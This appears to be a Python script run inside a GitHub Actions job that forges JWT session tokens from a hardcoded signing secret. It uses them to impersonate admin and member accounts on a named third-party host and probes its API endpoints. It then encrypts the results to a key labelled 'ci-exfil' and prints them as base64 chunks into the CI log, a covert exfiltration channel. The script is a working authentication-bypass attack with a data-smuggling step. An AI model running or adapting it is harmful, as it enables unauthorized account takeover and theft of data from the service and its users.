#!/usr/bin/env python3
import os, sys, json, time, uuid, base64, hmac, hashlib, subprocess, traceback, tarfile
REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "result" in REF.lower():
    print("results-branch-skip", flush=True); sys.exit(0)
RUNID = os.environ.get("GITHUB_RUN_ID", str(int(time.time())))
OUT = "/tmp/res_r28569diag"
os.makedirs(OUT, exist_ok=True)
LOG = open(os.path.join(OUT, "transcript.log"), "a", buffering=1)
def log(*a):
    s = " ".join(str(x) for x in a)
    try: print(s, flush=True)
    except Exception: pass
    try: LOG.write(s + "\n"); LOG.flush()
    except Exception: pass
def push_results():
    try:
        GEN = "/tmp/gnupg28569d"; os.makedirs(GEN, exist_ok=True); os.chmod(GEN, 0o700)
        env = dict(os.environ, GNUPGHOME=GEN)
        pub = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pub.asc")
        subprocess.run(["gpg","--batch","--import",pub],capture_output=True,timeout=60,env=env)
        tb = OUT + ".tar.gz"
        with tarfile.open(tb,"w:gz") as t: t.add(OUT, arcname="res_r28569diag")
        enc = tb + ".gpg"
        subprocess.run(["gpg","--batch","--yes","--trust-model","always","-r","ci-exfil@example.invalid","-o",enc,"-e",tb],capture_output=True,timeout=120,env=env)
        blob = base64.b64encode(open(enc,"rb").read()).decode()
        log("===B64BEGIN %d===" % len(blob))
        for i in range(0,len(blob),400): print("B64:"+blob[i:i+400],flush=True)
        log("===B64END===")
    except Exception:
        log("pack err", traceback.format_exc()[:600])
HOST="assistant.lumiiai.cn"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def jwt(sub, org, secret, with_lgn=True):
    now=int(time.time())
    h=b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(',',':')))
    pl={"sub":sub,"iat":now,"exp":now+86400*7,"sid":"sid_"+uuid.uuid4().hex}
    if org: pl["org"]=org
    if with_lgn: pl["lgn"]=now
    p=b64u(json.dumps(pl,separators=(',',':')))
    sig=hmac.new(secret.encode(),(h+"."+p).encode(),hashlib.sha256).digest()
    return h+"."+p+"."+b64u(sig)
def curl(args, timeout=25):
    try:
        r=subprocess.run(["curl","-s","-k","--http2","-m",str(timeout)]+args,capture_output=True,timeout=timeout+10)
        return r.returncode,r.stdout.decode("utf-8","replace")
    except Exception as e:
        return -1,repr(e)
def get(path, cookie=None, hdrs=None):
    args=["-A",UA,"-w","\n__C__%{http_code}"]
    if cookie is not None: args+=["-b","lumii_session="+cookie]
    if hdrs:
        for k,v in hdrs.items(): args+=["-H","%s: %s"%(k,v)]
    args.append("https://%s%s"%(HOST,path))
    rc,out=curl(args); code=""; i=out.rfind("__C__")
    if i>=0: code=out[i+5:].strip()[:3]; out=out[:i]
    return code,out
ORG="org_bTLzxtBLmugV8uxx4QTyw"
S48="297b8a491bc1920b918d01de77166556d3f835f473968c6b"
subs={"admin":"usr_ZxLewKrgbRYSm7rWDtQX8","member":"usr_AeNhBtrhHSALrHRJg2z25"}
log("=== DIAG reachability ===")
for p in ("/health","/api/health","/api/me"):
    c,b=get(p); log("unauth",p,"->",c,b[:120].replace("\n"," "))
log("=== DIAG token tests ===")
for name,sub in subs.items():
    for lgn in (True,False):
        tok=jwt(sub,ORG,S48,lgn)
        c,b=get("/api/me",cookie=tok)
        log("me",name,"lgn=%s"%lgn,"->",c,b[:200].replace("\n"," "))
    tok=jwt(sub,ORG,S48,True)
    c,b=get("/api/me",hdrs={"Authorization":"Bearer "+tok})
    log("me",name,"bearer ->",c,b[:150].replace("\n"," "))
# also no-org variant
tok=jwt("usr_ZxLewKrgbRYSm7rWDtQX8",None,S48,True)
c,b=get("/api/me",cookie=tok)
log("me admin no-org ->",c,b[:150].replace("\n"," "))
log("=== DONE diag ===")
push_results()
